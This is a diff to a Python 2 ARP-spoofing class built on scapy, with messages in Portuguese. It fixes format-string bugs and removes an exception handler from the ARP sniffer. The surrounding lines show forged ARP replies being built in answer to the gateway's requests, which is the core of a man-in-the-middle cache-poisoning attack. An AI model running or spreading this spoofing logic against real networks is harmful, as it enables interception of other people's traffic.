@@ -91,11 +91,7 @@ class ARPspoof(object):
 			sys.exit("[!] Especifique um Endereço/Range IP válido como alvo.")
 
 	def start_arp_mon(self):
-		try:
-			sniff(prn=self.arp_mon_callback, filter="arp", store=0)
-		except Exception as e:
-			if "Interrupted system call" not in e:
-				print "[!] Exceção ocorreu enquanto iniciava o sniffer: {}".format(e)
+		sniff(prn=self.arp_mon_callback, filter="arp", store=0)
 
 	def arp_mon_callback(self,pkt):
 		if self.send is True:
@@ -111,7 +107,7 @@ class ARPspoof(object):
 					packet.pdst = str(pkt[ARP].psrc)
 
 				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
-					print '[ARPmon] Gateway está perguntando onde {] está. Enviando: "Eu sou {] como resposta"'.format(pkt[ARP].pdst, pkt[ARP].pdst)
+					print '[ARPmon] Gateway está perguntando onde {} está. Enviando: "Eu sou {} como resposta"'.format(pkt[ARP].pdst, pkt[ARP].pdst)
 					packet = ARP()
 					packet.op = 2
 					packet.psrc = self.gateway
@@ -119,7 +115,7 @@ class ARPspoof(object):
 					packet.pdst = str(pkt[ARP].pdst)
 
 				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
-					print "[ARPmon] Gateway está perguntando onde está {}. Enviando: 'Sou {}!'".format(pkt[ARP].pdst)
+					print "[ARPmon] Gateway está perguntando onde está {}. Enviando: 'Sou {}!'".format(pkt[ARP].pdst,pkt[ARP].pdst)
 					packet = ARP()
 					packet.op = 2
 					packet.psrc = self.myip
